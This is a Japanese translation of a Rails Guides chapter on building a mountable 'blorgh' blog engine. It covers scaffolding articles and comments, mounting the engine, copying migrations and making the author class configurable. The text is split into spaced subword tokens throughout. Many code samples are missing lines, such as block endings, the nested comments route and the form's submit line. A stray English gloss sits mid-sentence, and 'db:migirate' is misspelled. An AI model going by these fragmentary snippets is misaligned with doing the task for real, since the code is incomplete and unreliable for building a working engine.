▁ 言 う まで も なく 、` Engine ` クラス に ` is ol at e _ name space ` を持つ エンジン で この bin / rails を使用して 生成 した もの はすべて 名前空間化され る ことにご注意ください 。
▁#### ▁` test ` ディレクトリ
▁` test ` ディレクトリ は 、 エンジン が テスト を行なう ための 場所 です 。
▁ エンジン をテストする ために 、` test / d um my ` ディレクトリ に 埋 め 込 まれ た 縮 小 版 の Rails アプリケーション が 用 意 されます 。
▁この アプリケーション は エンジン を ` test / d um my / config / routes . rb ` ファイル 内で 以下のように マウント します 。
▁ m o un t ▁ Blorgh :: Engine ▁=> ▁" / blorgh "
▁上の 行 によって 、` / blorgh ` パス にある エンジン が マウント され 、 アプリケーションの この パス を 通 じ て のみ アクセス 可能 になります 。
▁test ディレクトリ の下に は ` test / integration ` ディレクトリ があります 。 ここに は エンジンの 結合 テストが 置かれます 。
▁` test ` ディレクトリ に 他の ディレクトリ を作成する こともできます 。
▁たとえば 、 モデルの テスト 用 に ` test / models ` ディレクトリ を作成して も 構 いません 。
▁ エンジンの 機能を 提 供 する
▁ 本ガイドで 説明 のために 作成する エンジン には 、 記事 と コメント の 送信 機能 があります 。 基本的に は [ Rails を は じ め よう ]( getting _ started . html ) と よく 似 た ス レ ッ ド に従い ます が 、 多 少 の 新 味 も 加 え られ ています 。
▁### ▁Article リソース を生成する
▁ ブログ エンジン で 最初に 生成 すべき は ` Article ` モデルと それ に 関連する コントローラ です 。
▁ これら を 手 軽 に 生成 するために 、 Rails の scaffold ジェネレータ を使用します 。
▁$ ▁ bin / rails ▁ generate ▁ scaffold ▁ article ▁ title : string ▁ text : text
▁上の コマンド を実行すると 以下の 情報 が 出力 されます 。
▁invo ke ▁ active _ record
▁create ▁ db / migrate / [ timestamp ] _ create _ blorgh _ articles . rb
▁create ▁app / models / blorgh / article . rb
▁invo ke ▁test _ un it
▁create ▁test / models / blorgh / article _ test . rb
▁create ▁test / fixtures / blorgh / articles . yml
▁invo ke ▁ resource _ route
▁ resources ▁: articles
▁invo ke ▁ scaffold _ controller
▁create ▁app / controllers / blorgh / articles _ controller . rb
▁invo ke ▁ erb
▁create ▁app / views / blorgh / articles
▁create ▁app / views / blorgh / articles / index . html . erb
▁create ▁app / views / blorgh / articles / edit . html . erb
▁create ▁app / views / blorgh / articles / show . html . erb
▁create ▁app / views / blorgh / articles / new . html . erb
▁create ▁app / views / blorgh / articles / _ form . html . erb
▁create ▁test / controllers / blorgh / articles _ controller _ test . rb
▁invo ke ▁ helper
▁create ▁app / helpers / blorgh / articles _ helper . rb
▁invo ke ▁ assets
▁invo ke ▁ js
▁create ▁app / assets / javascripts / blorgh / articles . js
▁invo ke ▁ css
▁create ▁app / assets / stylesheets / blorgh / articles . css
▁invo ke ▁ css
▁create ▁app / assets / stylesheets / scaffold . css
▁ scaffold ジェネレータ が 最初に 行なう のは ` active _ record ` ジェネレータ の 呼び出し です 。 これは マイグレーション の 生成 と その リソース の モデル を生成します 。
▁ここで ご 注 目 い ただ き たい のは 、 マイグレーション は 通常の ` create _ articles ` ではなく ` create _ blorgh _ articles ` という 名前 で 呼ばれ る という 点 です 。
▁これは ` Blorgh :: Engine ` クラスの 定義 で 呼び出される ` is ol at e _ name space ` メソッド による ものです 。
▁この モデル も 名前空間化され る ので 、` Engine ` クラス 内の is ol at e _ name space ` 呼び出し によって 、` app / models / article . rb ` ではなく ` app / models / blorgh / article . rb ` に 置かれます 。
▁続いて 、 その モデル に対応する ` test _ un it ` ジェネレータ が 呼び出され 、 ( ` test / models / article _ test . rb ` ではなく ) ▁` test / models / blorgh / article _ test . rb ` ▁ に モデルの テストが 置かれます ▁( r at her ▁ th an ▁ )。 フィクスチャ も同様に ▁( ` test / fixtures / articles . yml ` ではなく ) ▁` test / fixtures / blorgh / articles . yml ` に 置かれます 。
▁ その後 、 その リソース に対応する 行 が ` config / routes . rb ` ファイルに 挿 入 され 、 エンジン で 使用されます 。
▁ここで 挿 入 される 行 は 単 に ` resources ▁: articles ` と な っています 。 これにより 、 その エンジン で使用する ` config / routes . rb ` ファイルが 以下のように 変更 されます 。
▁ Blorgh :: Engine . routes . d raw ▁do
▁ resources ▁: articles
▁この ルーティング は 、` Y our A p p :: Application ` クラス ではなく ` Blorgh :: Engine ` オブジェクト にも と づ い ている ことにご注目ください 。
▁これにより 、 エンジンの ルーティング が エンジン 自身 に 制限 され 、[ test ディレクトリ ]( # test ディレクトリ ) セクション で 説明したように 特定の 位 置 に マウント できるようになります 。
▁ここでは 、 エンジンの ルーティング が アプリケーション 内の ルーティング から 分 離 されている ことに も ご 注 目 ください 。
▁詳細については 本 ガイド の [ ルーティング ]( # ルーティング ) セクション で 解説します 。
▁続いて ` scaffold _ controller ` ジェネレータ が 呼ばれ 、` Blorgh :: Article sController ` という名前の コントローラ を生成します ▁( 生成 場所 は ` app / controllers / blorgh / articles _ controller . rb ` です )。 この コントローラに 関連する ビュー は ` app / views / blorgh / articles ` となります 。
▁この ジェネレータ によって 生成される もの はすべて 正しく 名前空間化され ます 。
▁この コントローラの クラス は 、 以下のように ` Blorgh ` モジュール 内で 定義 されます 。
▁class ▁Article sController ▁< ▁ Application Controller
▁ ...
▁NOT E : ▁この クラス で 継 承 されている ` Application Controller ` クラス は 、 実際には ` Application Controller ` ではなく 、` Blorgh :: Application Controller ` です 。
▁` app / helpers / blorgh / articles _ helper . rb ` の ヘルパー も同様に 名前空間化され ます 。
▁ module ▁Article s Helper
▁これにより 、 たとえ 他の エンジン や アプリケーションに article リソース が あって も 衝 突 を 回 避 できます 。
▁最後に 、 以下の 2 つの ファイルが この リソース の アセット として 生成されます 。
▁` app / assets / javascripts / blorgh / articles . js ` と
▁` app / assets / stylesheets / blorgh / articles . css ` です 。
▁これらの 使用 法 については この すぐ 後 で 解説します 。
▁ デフォルトで は 、 scaffold で 生成された スタイル は エンジン に適用 されません 。 これは 、 エンジンの レイアウト ファイル ` app / views / layouts / blorgh / application . html . erb ` が scaffold の スタイル を 読み 込 んで い ない ためです 。
▁ scaffold で 生成された スタイル を 適 用 するには 、 この レイアウト の ` < head > ` タグ に 以下の行 を 挿 入 します 。
▁<%= ▁ stylesheet _ link _ tag ▁" scaffold " ▁%>
▁ エンジンの ルート ディレクトリ で ` rake ▁ db : migrate ` を実行すると 、 scaffold ジェネレータ によって 生成された マイグレーション が 実行されます 。 続いて ` test / d um my ` ディレクトリ で ` rails ▁ server ` を実行し てみましょう 。
▁` http :// localhost :3000/ blorgh / articles ` を ブラウザで 表示する と 、 生成された デフォルトの scaffold が表示されます 。
▁ 表示 された もの を い ろ い ろ クリック してみてください 。
▁これで 、 最初の 機能を 備 え た エンジンの 生成 に 成功 しました 。
▁ コンソール で 遊 んで み たい のであれば 、` rails ▁console ` で Rails アプリケーションを コンソール で 動か せ ます 。
▁ 先ほど から 申 し 上 げ ている ように 、` Article ` モデル は 名前空間化され ています ので 、 この モデル を参照 する 際に は ` Blorgh :: Article ` と 指定 する必要があります 。
▁ >> ▁ Blorgh :: Article . find (1)
▁=> ▁#< Blorgh :: Article ▁id : ▁1 ▁ ...
▁ 最後の 作業 です 。 この エンジンの ` articles ` リソース は エンジンの ルート ▁( root ) ▁ パス に置く の が ふ さ わ しい でしょう 。
▁ エンジン が マウント されている ルート パス に移動し たら 、 記事 の 一覧 が表示される ように したい ものです 。
▁ エンジン にある ` config / routes . rb ` ファイルに 以下の 記述 を追加する ことで これを 実現 できます 。
▁ root ▁to : ▁" articles # index "
▁これで 、 ユーザーが ▁( ` / articles ` ではなく ) ▁ エンジンの ルート パス に 移動 すると 記事 の 一覧 が表示される ようになりました 。
▁つまり 、` http :// localhost :3000/ blorgh / articles ` に移動し なくても ` http :// localhost :3000/ blorgh ` に 移動 すれば 済 む ということです 。
▁### ▁ comments リソース を生成する
▁ エンジン で 記事 を 新規作成 できるようになりました ので 、 今度は 記事 に コメント を追加する 機能 も 付け てみましょう 。
▁これ を行なう には 、 comment モデルと comments コントローラ を生成し 、 articles ▁ scaffold を変更 して コメント を 表示 できるように し 、 それ から 新 規 コメント を作成 できるようにします 。
▁ アプリケーションの ルート ・ ディレクトリ で 、 モデルの ジェネレータ を実行します 。
▁このとき 、` Comment ` モデル を生成する こと 、 integer 型 の ` article _ id ` カラム と text 型 の ` text ` カラム を持つ テーブル と 関連付け ること を 指示 します 。
▁$ ▁ bin / rails ▁ generate ▁ model ▁ Comment ▁ article _ id : integer ▁ text : text
▁ 上 によって 以下 が 出力 されます 。
▁create ▁ db / migrate / [ timestamp ] _ create _ blorgh _ comments . rb
▁create ▁app / models / blorgh / comment . rb
▁invo ke ▁test _ un it
▁create ▁test / models / blorgh / comment _ test . rb
▁create ▁test / fixtures / blorgh / comments . yml
▁この ジェネレータ 呼び出し では 必要な モデル ファイル だけ が 生成されます 。 さらに ` blorgh ` ディレクトリ の 下 で 名前空間化され 、` Blorgh :: Comment ` という モデル クラス も 作成されます 。
▁それでは マイグレーション を実行して blorgh _ comments テーブル を生成し てみましょう 。
▁$ ▁rake ▁ db : migrate
▁ 記事 の コメント を 表示 できるように するために 、` app / views / blorgh / articles / show . html . erb ` を 編集 して 以下の行 を " Edit " リンク の 直 前 に追加します 。
▁< h 3 > Comment s </ h 3 >
▁<%= ▁render ▁@ article . comments ▁%>
▁上の 行 では 、` Blorgh :: Article ` モデルと コメント が ` has _ many ` 関連付け として 定義されている 必要があります が 、 現時点では まだ ありません 。
▁この 定義 を行なう ために 、` app / models / blorgh / article . rb ` を開いて モデルに 以下の行 を追加します 。
▁has _ many ▁: comments
▁これにより 、 モデル は以下のようになります 。
▁class ▁Article ▁< ▁ActiveRecord :: Base
▁has _ many ▁: comments
▁NOT E : ▁この ` has _ many ` は ` Blorgh ` モジュール の中に ある クラス の中で 定義 されています 。 これ だけで 、 これらの オブジェクト に対して ` Blorgh :: Comment ` モデル を使用した い という 意 図 が Rails に 自動的に 認 識 されます 。 従って 、 ここで `: class _ name ` オプション を使用して クラス名 を指定する 必要はありません 。
▁続いて 、 記事 を作成する ための フォーム を 作成する必要があります 。
▁ フォーム を追加する には 、` app / views / blorgh / articles / show . html . erb ` の ` render ▁@ article . comments ` 呼び出し の 直 後に 以下の行 を追加します 。
▁<%= ▁render ▁" blorgh / comments / form " ▁%>
▁続いて 、 この 行 を 出力 に含め るため の パーシャル ▁( 部分 テンプレート ) ▁ も 必要 です 。
▁` app / views / blorgh / comments ` に ディレクトリ を作成し 、` _ form . html . erb ` という ファイル を作成します 。 この ファイル の中に 以下の パーシャル を 記述 します 。
▁< h 3 > New ▁ comment </ h 3 >
▁<%= ▁ form _ for ▁[ @ article , ▁@ article . comments . build ] ▁do ▁| f | ▁%>
▁<%= ▁f . label ▁: text ▁% >< br >
▁<%= ▁f . text _ ar e a ▁: text ▁%>
▁</ p >
▁この フォーム が 送信 される と 、 エンジン 内の ` / articles / : article _ id / comments ` という ルーティング に対して ` POST ` リクエスト を送信し よう とします 。
▁この ルーティング はまだ 存 在 していません ので 、` config / routes . rb ` の ` resources ▁: articles ` 行 を 以下のように 変更 します 。
▁ resources ▁: articles ▁do
▁これで comments 用の ネスト した ルーティング が作成され ました 。 これ が 上の フォーム で 必要 となります 。
▁ ルーティング は 作成 しました が 、 ルーティング 先 の コントローラ が まだ ありません 。
▁これ を作成する には 、 アプリケーションの ルート ・ ディレクトリ で 以下のコマンドを実行し ます 。
▁$ ▁ bin / rails ▁ g ▁ controller ▁ comments
▁ 上 によって 以下 が 生成されます 。
▁create ▁app / controllers / blorgh / comments _ controller . rb
▁create ▁test / controllers / blorgh / comments _ controller _ test . rb
▁invo ke ▁ helper
▁create ▁app / helpers / blorgh / comments _ helper . rb
▁create ▁app / assets / javascripts / blorgh / comments . js
▁create ▁app / assets / stylesheets / blorgh / comments . css
▁この フォーム は ` POST ` リクエストを ` / articles / : article _ id / comments ` に 送信 します 。 これ に対応する のは ` Blorgh :: Comment sController ` の ` create ` アクション です 。
▁この アクション を 作成する必要があります 。 ` app / controllers / blorgh / comments _ controller . rb ` の クラス 定義 の中に 以下の行 を追加します 。
▁def ▁create
▁@ article ▁= ▁Article . find ( params [: article _ id ] )
▁@ comment ▁= ▁@ article . comments . create ( comment _ params )
▁ flash [: no tic e ] ▁= ▁" Comment ▁has ▁be en ▁ created ! "
▁ redirect _ to ▁ articles _ path
▁ private
▁def ▁ comment _ params
▁ params . require (: comment ). per m it (: text )
▁ いよいよ 、 コメント フォーム が 動作する の に 必要な 最後の 手順 を行い ましょう 。
▁ コメント はまだ 正常に 表示 できません 。
▁ この時点で コメント を作成し よう と すると 、 以下のような エラー が 生じる でしょう 。
▁: format s => [: html ] , ▁: local e => [: en , ▁: en ]} .
▁S e ar ch ed ▁in : ▁*
▁" / Users / ry an / S it es / s id e _ projects / blorgh / test / d um my / app / views " ▁*
▁" / Users / ry an / S it es / s id e _ projects / blorgh / app / views "
▁この エラー は 、 コメント の 表示 に 必要な パーシャル が 見つからない ためです 。
▁Rails は アプリケーションの ▁( ` test / d um my ` ) ▁` app / views ` を 最初に 検索 し 、 続いて エンジンの ` app / views ` ディレクトリ を 検索 します 。
▁ 見つからない 場合は エラー になります 。
▁ さ し あ た って 、 コメント テキスト を出力する 役 目 を この パーシャル に 担 って も ら わ なければなりません 。
▁` app / views / blorgh / comments / _ comment . html . erb ` ファイル を作成し 、 以下の 記述 を追加します 。
▁<%= ▁ comment _ counter ▁+ ▁1 ▁%> . ▁<%= ▁ comment . text ▁%>
▁` <%= ▁render ▁@ article . comments ▁%> ` 呼び出し によって ` comment _ counter ` ローカル変数 が返されます 。 この 変数 は自動的に 定義 され 、 コメント を i ter at e する たびに カウント アップ します 。
▁この 例 では 、 作成された コメント の 横 に 小さな 数字 を表示する の に 使用 しています 。
▁これで ブログ エンジンの コメント 機能 が できました 。
▁今度は この 機能を アプリケーション の中で 使用 してみましょう 。
▁ アプリケーションに フック する
▁ エンジン を アプリケーションで 利用 する のは き わ め て 簡単 です 。
▁ 本 セクション では 、 エンジン を アプリケーションに マウント して 必要な 初期 設定 を行い 、 アプリケーション が提供する ` User ` クラス に エンジン を リンク して 、 エンジン 内の 記事 と コメント に 所 有 者 を与える ところ まで を カ バー します 。
▁### ▁ エンジン を マウント する
▁最初に 、 使用する エンジン を アプリケーションの ` Gemfile ` に 記述 する必要があります 。
▁ テスト に 使用できる 手 頃 な アプリケーション が 見 当 たら ない場合は 、 エンジンの ディレクトリ の 外 で 以下の ` rails ▁ new ` コマンド を実行して アプリケーション を作成 してください 。
▁$ ▁ rails ▁ new ▁ un i c or n
▁ 基本的に は 、 Gemfile で エンジン を指定する 方法は 他の gem の 指定 方法 と 変 わ り ません 。
▁gem ▁' de v is e '
▁ただし 、 この ` blorgh ` エンジン は ローカル P C で 開発 中 で gem リポジトリ には 存在しない ので 、` Gemfile ` で エンジン gem への パス を `: path ` オプション で 指定 する必要があります 。
▁gem ▁' blorgh ', ▁ path : ▁" / path / to / blorgh "
▁続いて ` bundle ` コマンド を実行し 、 gem を インストール します 。
▁ 前 述 した ように 、` Gemfile ` に 記述 した gem は Rails の 読み込み 時に 読み込まれ ます 。
▁この gem は 最初に エンジンの ` lib / blorgh . rb ` を require し 、 続いて ` lib / blorgh / engine . rb ` を require します 。 後 者 はこの エンジンの 機能を 担 う 主要な 部品 が 定義されている 場所 です 。
▁ アプリケーション から エンジンの 機能 にアクセス できるように するには 、 エンジン を アプリケーションの ` config / routes . rb ` ファイル で マウント する必要があります 。
▁ m o un t ▁ Blorgh :: Engine , ▁ at : ▁" / blog "
▁この 行 を 記述 することで 、 エンジン が アプリケーションの ` / blog ` パス に マウント されます 。
▁` rails ▁ server ` を実行して Rails を 起動 すること 、` http :// localhost :3000/ blog ` にアクセス できるようになります 。
▁NOT E : ▁D e v is e などの 他の エンジン では この 点が 若 干 異 なり 、 ルーティング で ▁( ` de v is e _ for ` などの ) ▁ カスタム ヘルパー を指定する もの があります 。
▁これらの ヘルパー の動作 は 完全に 同じです 。 事 前に 定義された カスタマイズ 可能な パス に エンジンの 機能 の一部 を マウント します 。
▁### ▁ エンジンの 設定
▁作成した エンジン には ` blorgh _ articles ` テーブル と ` blorgh _ comments ` テーブル 用の マイグレーション が含まれ ます 。 これらの テーブル を アプリケーションの データベースに 作成 し 、 エンジンの モデル から これらの テーブル にアクセス できるように する必要があります 。
▁これらの マイグレーション を アプリケーションに コピー するには 、 以下のコマンドを実行し ます 。
▁$ ▁rake ▁ blorgh : install : migration s
▁ マイグレーション を コピー する 必要 のある エンジン が い く つ も ある 場合は 、 代りに ` railties : install : migration s ` を使用します 。
▁$ ▁rake ▁ railties : install : migration s
▁この コマンド は 、 初 回 実行 時に エンジン から すべての マイグレーション を コピー します 。
▁ 次 回 以降 の 実行 時に は 、 コピー されていない マイグレーション のみ が コピー されます 。
▁この コマンド の 初 回 実行 時の 出力結果 は以下のようになります 。
▁ 最初の タイムスタンプ ▁( ` [ timestamp _ 1 ] ` ) ▁ が 現在 時刻 、 次の タイムスタンプ ▁( ` [ timestamp _ 2 ] ` ) ▁ が 現在 時刻 に 1 秒 追加 した 値 になります 。
▁この よう になっている のは 、 エンジンの マイグレーション は アプリケーションの 既存の マイグレーション が すべて 終わっ て から 実行 する 必要がある ためです 。
▁ アプリケーションの コンテキスト で マイグレーション を実行する には 、 単 に ` rake ▁ db : m ig ir at e ` を実行します 。
▁` http :// localhost :3000/ blog ` で エンジン にアクセス すると 、 記事 は 空 の 状態 です 。
▁これは 、 アプリケーションの 内部で 作成された テーブル は エンジンの 内部で 作成された テーブル とは 異なる ためです 。
▁ 新しく マウント した エンジン で もっと い ろ い ろ や って みましょう 。
▁ アプリケーションの 動作 は 、 エンジン を 単 体 で 動か している とき と同じ であること に 気 付 く ことでしょう 。
▁ エンジン を 1 つ だけ マイグレーション したい場合 、 以下のように ` S C O P E ` を指定します 。
▁rake ▁ db : migrate ▁S C O P E = blorgh
▁この オプションは 、 エンジン を削除する 前に マイグレーション を 元に戻 したい場合 など に 便利です 。
▁ blorgh エンジン による すべての マイグレーション を 基 に 戻 したい場合は 以下のような コマンド を実行します 。
▁rake ▁ db : migrate ▁S C O P E = blorgh ▁ V ER S I ON = 0
▁### ▁ アプリケーション が提供する クラス を使用する
▁#### ▁ アプリケーション が提供する モデル を使用する
▁ エンジン を ひとつ 作成する と 、 や が て エンジンの 部品 と アプリケーションの 部品 を 連 携 させる ために 、 アプリケーションの 特定の クラス を エンジン から 利用 した くなる でしょう 。
▁この ` blorgh ` エンジン であれば 、 記事 と コメント の 作 者 の 情報 がある 方が ず っ と わかりやすく なります 。
▁ 普通 の アプリケーション であれば 、 記事 や コメント の 作 者 を表す ための ` User ` クラス が 備 わ っている でしょう 。
▁しかし クラス名 が User とは 限 り ません 。 アプリケーション によって は ` Person ` という クラス である かもしれません 。
▁ このような 状 況 に対応する ために 、 この エンジン では ` User ` クラス と の 関連付けを ハ ー ド コード し ないように すべき です 。
▁ここでは 話 を簡単に する ため 、 アプリケーション が ユーザー を表す ために 持つ クラス は ` User ` で あるとします ▁( この後 で もっと カスタマイズ し や す く します )。
▁この クラス は 、 アプリケーションで 以下のコマンドを実行し て 生成 できます 。
▁ rails ▁ g ▁ model ▁ user ▁name : string
▁ 今後 ` users ` テーブル を アプリケーションで 使用 できるように するために 、 ここで ` rake ▁ db : migrate ` を実行する 必要があります 。
▁ 話 を簡単に する ため 、 記事 の フォームの テキスト フィールド は ` author _ name ` と する ことにします 。 記事 を 書く ユーザーが ここに 自分の 名前 を 入 れ られ るように します 。
▁ エンジン はこの 名前 を使用して ` User ` オブジェクトを 新規作成 するか 、 その 名前 が 既に ある かどうか を調べ ます 。
▁続いて 、 エンジン は 作成 または 見つけ た ` User ` オブジェクトを 記事 と 関連付け ます 。
▁最初に 、` author _ name ` テキスト フィールド を エンジンの パーシャル ` app / views / blorgh / articles / _ form . html . erb ` に 追加する必要があります 。
▁ そこで 、 以下のコード を ` title ` フィールド の すぐ 上 に追加します 。
▁< div ▁class =" field ">
▁<%= ▁f . label ▁: author _ name ▁% >< br >
▁<%= ▁f . text _ field ▁: author _ name ▁%>
▁続いて 、 エンジンの ` Blorgh :: Article Controller # article _ params ` メソッドを 更新 して 、 新しい フォーム パラメータ を 受け 付け るように する 必要 もあります 。
▁def ▁ article _ params
▁ params . require (: article ). per m it (: title , ▁: text , ▁: author _ name )
▁次に 、` Blorgh :: Article ` モデルに も ` author _ name ` フィールド を 実際の ` User ` オブジェクト に変換 し 、` User ` オブジェクトを 記事 の ` author ` と 関連付け て から 記事 を保存する コード が必要です 。
▁この フィールド 用の ` attr _ accessor ` も 設定 する必要があります 。 これにより 、 この フィールド 用の ゲ ッ ター と セ ッ ター が 定義 されます 。
▁ これら をすべて 行なう には 、` author _ name ` 用の ` attr _ accessor ` と 、 author と の 関連付け 、 および ` before _ save ` 呼び出し を ` app / models / blorgh / article . rb ` に 追加する必要があります 。
▁` author ` 関連付け は 、 この時点で は あえて ` User ` クラス と ハ ー ド コード しておきます 。
▁ attr _ accessor ▁: author _ name
▁ belongs _ to ▁: author , ▁class _ name : ▁" User "
▁ before _ save ▁: set _ author
▁def ▁ set _ author
▁self . author ▁= ▁User . find _ or _ create _ by ( name : ▁ author _ name )
▁` author ` オブジェクト と ` User ` クラスの 関連付けを 示す ことにより 、 エンジン と アプリケーション の間に リンク が 確 立 されます 。
▁` blorgh _ articles ` テーブル の レコード と 、` users ` テーブル の レコード を 関連付け るため の 方法 が必要です 。
▁この 関連付け は ` author ` という 名前 なので 、` blorgh _ articles ` テーブル には ` author _ id ` という カラム が追加され る必要があります 。
▁この 新しい カラム を追加する には 、 エンジンの ディレクトリ で 以下の コマンド を実行する 必要があります 。
▁$ ▁ bin / rails ▁ g ▁ migration ▁ add _ author _ id _ to _ blorgh _ articles ▁ author _ id : integer
▁NOT E : ▁上の ように コマンド オプション で マイグレーション 名 と カラム の 仕 様 を指定する ことで 、 特定の テーブル に追加 し よう と している カラム が Rails によって自動的に 認 識 され 、 そのため の マイグレーション が 作成されます 。
▁この 他 に オプション を指定する 必要はありません 。
▁この マイグレーション は アプリケーション に対して 実行 する必要があります 。
▁これ を行なう には 、 最初に 以下のコマンドを実行し て マイグレーション を エンジン から コピー する必要があります 。
▁上の コマンドで コピー される マイグレーション は ▁ _ 1 つ _ ▁ だけ である 点 に ご注意ください 。
▁これは 、 最初の 2 つの マイグレーション はこの コマンド が 初めて 実行 された ときに コピー 済み である ためです 。
▁ Migration ▁with ▁the ▁ s am e ▁name ▁ al read y ▁ exists .
▁この マイグレーション を実行する コマンド は 以下の とおりです 。
▁これで すべての 部品 が 定 位 置 に置かれ 、 ある 記事 ▁( article ) ▁ を 、` users ` テーブル の レコード で 表 される 作 者 ▁( author ) ▁ に 関連付け る アクション が 実行される ようになりました 。 この 記事 は ` blorgh _ articles ` テーブル で 表 されます 。
▁最後に 、 作 者 名を 記事 の ページに 表示 しましょう 。
▁` <%= ` タグ を使用して `@ article . author ` を出力する と 、` to _ s ` メソッドが この オブジェクト に対して 呼び出され ます 。
▁この 出力 は デフォルトの ま まで は 整 形 されていません 。
▁これで Ruby の 生 の オブジェクト 出力 が 整 形 され 、 作 者 名 が表示される ようになります 。
▁#### ▁ アプリケーションの コントローラ を使用する
▁Rails の コントローラ では 、 認 証 や セッション 変数 への アクセス に関する コードを アプリケーション 全体 で 共有 する の が 一般的 です 。 従って 、 このような コード はデフォルトで ` Application Controller ` から 継 承 します 。
▁しかし 、 Rails の エンジン は 基本的に メ イン となる アプリケーション から 独 立 している ので 、 エンジン が 利用できる ` Application Controller ` は スコープ で 制限 されています 。
▁ 名前空間 が 導入 されている ことで コードの 衝 突 は 回 避 されます が 、 エンジンの コントローラ から メ イン アプリケーションの ` Application Controller ` の メソッド にアクセス する 必要 も 頻繁に 発生 します 。
▁ エンジンの コントローラ から メ イン アプリケーションの ` Application Controller ` への アクセス を 提 供 するには 、 エンジン が 所 有 する スコープ 付き の ` Application Controller ` に変更 を加え 、 メ イン アプリケーションの ` Application Controller ` を 継 承 する の が 簡単な 方法 です 。
▁ Blorgh エンジン の場合 、` app / controllers / blorgh / application _ controller . rb ` を 以下のように 変更 します 。
▁end
▁ エンジンの コントローラ はデフォルトで ` Blorgh :: Application Controller ` を継承し ます 。
▁上の 変更 を行なう ことで 、 あ た か も エンジン が アプリケーション の一部 である か のように 、 エンジンの コントローラ で ` Application Controller ` にアクセス できるようになります 。
▁この 変更 を行なう には 、 エンジン を ホスト する Rails アプリケーションに ` Application Controller ` という名前の コントローラ が存在する 必要があります 。
▁### ▁ エンジン を設定する
▁この セクション では 、` User ` クラス を カスタマイズ 可能 に する方法 を 解 説 し 、 続いて エンジンの 一般的な 設定 方法 について解説します 。
▁#### ▁ アプリケーションの 設定 を行なう
▁これ より 、 アプリケーションで ` User ` を表す クラス を エンジン から カスタマイズ 可能 に する方法について 説明します 。
▁ カスタマイズ したい クラス は 、 前 述 の ` User ` のような クラス ば か り とは 限 り ません 。
▁この クラス の設定 を カスタマイズ 可能 に するには 、 エンジン 内部 に ` author _ class ` という名前の 設定 が必要です 。 この 設定 は 、 親 アプリケーション 内部で ユーザー を表す クラス が ど れ である か を指定する ためのものです 。
▁この 設定 を定義する には 、 エンジン で使用する ` Blorgh ` モジュール 内部 に ` m attr _ accessor ` という ア ク セ ッ サ を 置 く 必要があります 。
▁ エンジン にある ` lib / blorgh . rb ` に 以下の行 を追加します 。
▁ m attr _ accessor ▁: author _ class
▁このメソッド の動作 は ` attr _ accessor ` や ` c attr _ accessor ` などの 兄弟 メソッド と似ています が 、 モジュール の ゲ ッ ター 名 と セ ッ ター 名 に 指定された 名前 を使用します 。
▁ これら を使用する場合 は ` Blorgh . author _ class ` という 名前 で 参 照 する必要があります 。
▁続いて 、` Blorgh :: Article ` モデルの 設定 を この 新しい 設定 に 切り 替 え ます 。
▁` app / models / blorgh / article . rb ` モデル 内の ` belongs _ to ` 関連付けを 以下のように 変更 します 。
▁ belongs _ to ▁: author , ▁class _ name : ▁ Blorgh . author _ class
▁` Blorgh :: Article ` モデルの ` set _ author ` メソッドは 以下の クラス も 使用 する必要があります 。
▁self . author ▁= ▁ Blorgh . author _ class . constantize . find _ or _ create _ by ( name : ▁ author _ name )
▁` author _ class ` で 保存 時に ` constantize ` が 必ず 呼び出される ように したい場合は 、` lib / blorgh . rb ` の ` Blorgh ` モジュール 内部 の ` author _ class ` ゲ ッ ター メソッドを オーバーライド する だけで できます 。 これにより 、 値 の 保存 時に 必ず ` constantize ` を 呼び出し て から 結果 が返されます 。
▁def ▁self . author _ class
▁@ @ author _ class . constantize
▁これにより 、` set _ author ` 用の 上のコード は以下のようになります 。
▁self . author ▁= ▁ Blorgh . author _ class . find _ or _ create _ by ( name : ▁ author _ name )
▁これにより 、 記述 が や や 短 く なり 、 動作 が や や 明 示 的 で なくなります 。
▁この ` author _ class ` メソッドは 常に ` Class ` オブジェクト を返す 必要があります 。
▁` author _ class ` メソッドが ` String ` ではなく ` Class ` を返す ように 変更 した ので 、` Blorgh :: Article ` の ` belongs _ to ` 定義 も それ に合わせて 変更 する必要があります 。
▁ belongs _ to ▁: author , ▁class _ name : ▁ Blorgh . author _ class . to _ s
▁この 設定 を アプリケーション 内で 行なう には 、 イニシャライザ を使用する 必要があります 。
▁ イニシャライザ を使用することで 、 アプリケーションの 設定 は アプリケーション が 起動 して エンジンの モデル を呼び出す まで に 完了 します 。 この 動作 は 既存の この 設定 に 依 存 する 場合 があります 。
▁` blorgh ` が インストール されている アプリケーションの ` config / initializers / blorgh . rb ` に イニシャライザ を作成して 、 以下の 記述 を追加します 。
▁WARN ING : ▁この クラス名 は 必ず ` String ` で ▁( = 引 用 符 で 囲 んで ) ▁ 表 してください 。 クラス 自身 を使用 しないでください 。
▁ クラス 自身 が 使用されている と 、 Rails は その クラス を 読み 込 んで 関連する テーブル を参照 し よう とします 。
▁このとき 参 照 先 の テーブル が 存在しない と 問題 が発生する 可能性があります 。
▁ このため 、 クラス名 は ` String ` で 表 し 、 後に エンジン が ` constantize ` で クラス に変換 する必要があります 。
▁続いて 、 新しい 記事 を 1 つ 作成 してみる ことにしましょう 。
▁ 記事 の作成 は これまで と まったく 同様に 行 え ます 。 1 つ だけ 異なる のは 、 今回は クラス の動作 を学ぶ ために ` config / initializers / blorgh . rb ` の設定 を エンジン で使用する 点 です 。
▁ 使用する クラス が そのため の API さ え 備 え ていれば 、 使用する クラス に 厳 密 に 依 存 する ことはありません 。
▁ エンジン で使用する クラス で 必 須 となる メソッドは ` find _ or _ create _ by ` のみ です 。 このメソッドは その クラスの オブジェクトを 1 つ 返します 。
▁もちろん 、 この オブジェクトは 何らかの 形 で 参 照 可能な 識 別 子 ▁( id ) ▁ を持つ 必要があります 。
▁#### ▁ 一般的な エンジンの 設定
▁ エンジン を使う う ち に 、 そ の中で イニシャライザ や 国 際 化 などの 機能 オプション を使用した くなる ことでしょう 。
▁ う れ しい ことに 、 Rails エンジン は Rails アプリケーション と 大 半 の 機能を 共有 している ので 、 これらは 完全に 実現 可能です 。
▁ 実際 、 Rails アプリケーション が 持つ 機能 は エンジン が 持つ 機能 の ス ー パ ー セット な のです 。
▁たとえば イニシャライザ ▁( エンジン が 読み込まれ る 前に 実行される コード ) ▁ を使用した い のであれば 、 そのため の 場所 である ` config / initializers ` フォルダ に置き ます 。
▁この ディレクトリ の 機能 については 『 Rails アプリケーション を設定する 』 ガイド の [ イニシャライザ ファイル を使用する ]( config ur ing . html # イニシャライザ ) を参照してください 。 エンジンの イニシャライザ は 、 アプリケーションの ` config / initializers ` ディレクトリ に置かれている イニシャライザ と まったく 同様に 動作します 。
▁ 標準 の イニシャライザ を使用したい場合 も 同様 です 。
